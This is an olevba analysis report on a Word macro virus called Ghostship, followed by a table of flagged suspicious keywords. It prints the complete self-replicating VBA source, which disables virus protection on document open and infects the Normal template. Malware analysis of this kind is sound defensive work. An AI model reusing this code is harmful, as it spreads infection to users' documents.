olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ghostship.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ghostship.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
Options.VirusProtection = False
NormalTemplate.VBProject.VBComponents(1).Export ("C:\Norm.bas")
ActiveDocument.VBProject.VBComponents(1).Export ("C:\Virus.bas")
Open "C:\Norm.bas" For Input As #9
On Error Resume Next

If LOF(9) < 600 Then
    Open "C:\Virus.bas" For Input As #1
    ElseIf LOF(1) < 600 Then
    Open "C:\Norm.bas" For Input As #1
    Else
    Close #1, #9
    GoTo NowISeeYou
End If

Do Until Chars = "Private Sub Document_Open()"
    Line Input #1, Chars
Loop

Do
    Line Input #1, Chars
    VirCode = VirCode & Chars & Chr(13)
Loop Until Chars = "WrittenBy = LordArz"

If LOF(9) < 600 Then
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 9, VirCode
    NormalTemplate.Save
    Else
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 9, VirCode
    ActiveDocument.Save
End If
Close #1, #9
Kill "C:\Virus.bas"
NowISeeYou:
Kill " C:\Norm.bas"
Randomize Timer
If Int(Rnd * 10) < 5 Then
'SetAttr "C:\Recycled", vbNormal
'RmDir "C:\Recycled"
End If
VirusName = GhostShip
WrittenBy = LordArz
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

